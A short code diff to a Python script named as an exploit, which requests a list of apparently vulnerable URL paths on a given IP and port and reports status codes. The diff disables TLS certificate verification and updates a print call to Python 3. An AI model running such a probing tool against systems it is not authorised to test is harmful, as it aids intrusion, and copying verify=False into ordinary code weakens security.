@@ -9,7 +9,7 @@ def exploit(dst_addr):
 
 	for i in vuln_list:
 			print(URL+i)
-			res = requests.get(URL+i)
+			res = requests.get(URL+i, verify=False)
 			print("Status Code : %d"% res.status_code)
 
 			if res.status_code==200:
@@ -21,7 +21,7 @@ if __name__ == "__main__":
 	if len(sys.argv) == 2:
                 sys.argv.append('80')
 	elif len(sys.argv) < 3:
-		print 'Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0])
+		print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
 		sys.exit()
 
 	address =(sys.argv[1], sys.argv[2])
